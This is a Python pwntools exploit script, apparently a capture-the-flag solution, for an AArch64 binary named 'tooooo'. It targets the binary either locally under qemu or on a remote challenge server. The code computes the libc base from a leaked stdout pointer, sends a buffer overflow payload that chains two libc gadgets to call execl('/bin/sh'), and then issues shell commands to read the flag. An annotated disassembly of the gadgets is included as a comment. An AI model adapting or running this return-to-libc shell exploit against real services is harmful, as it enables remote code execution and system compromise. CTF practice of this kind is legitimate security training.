#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./tooooo"
#  context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./tooooo"])
    libc = ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./tooooo"])
    libc = ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)
else:
    io = remote("13.230.48.252", 4869)
    libc = ELF("./lib/libc-2.27.so", checksec = False)

if __name__ == "__main__":
    libc.address = int(io.recvline(), 16) - libc.sym['_IO_2_1_stdout_']
    success("libc -> {:#x}".format(libc.address))

    payload = flat(cyclic(0x20), libc.address + 0x110700, libc.address + 0x63e90)
    io.sendline(payload)
    '''
    .text:0000000000110700                 MOV             X4, #0
    .text:0000000000110704                 MOV             X3, #0
    .text:0000000000110708                 BFXIL           X3, X4, #0, #0x30 ; '0'
    .text:000000000011070C                 MOV             W1, #0
    .text:0000000000110710                 MOV             X2, #0
    .text:0000000000110714                 FMOV            D0, X2
    .text:0000000000110718                 BFI             X3, X1, #0x30, #0xF ; '0'
    .text:000000000011071C                 MOV             W0, #0
    .text:0000000000110720                 BFI             X3, X0, #0x3F, #1 ; '?'
    .text:0000000000110724                 FMOV            V0.D[1], X3
    .text:0000000000110728                 RET
    
    .text:0000000000063E90                 ADRP            X0, #aBinSh@PAGE ; "/bin/sh"
    .text:0000000000063E94                 ADD             X0, X0, #aBinSh@PAGEOFF ; "/bin/sh"
    .text:0000000000063E98                 BL              execl
    '''

    try:
        io.sendline("echo ABCDEFG")
        io.recvuntil("ABCDEFG")
        io.sendline("ls")
        io.sendline("cat flag")
        io.interactive()
    except:
        io.close()
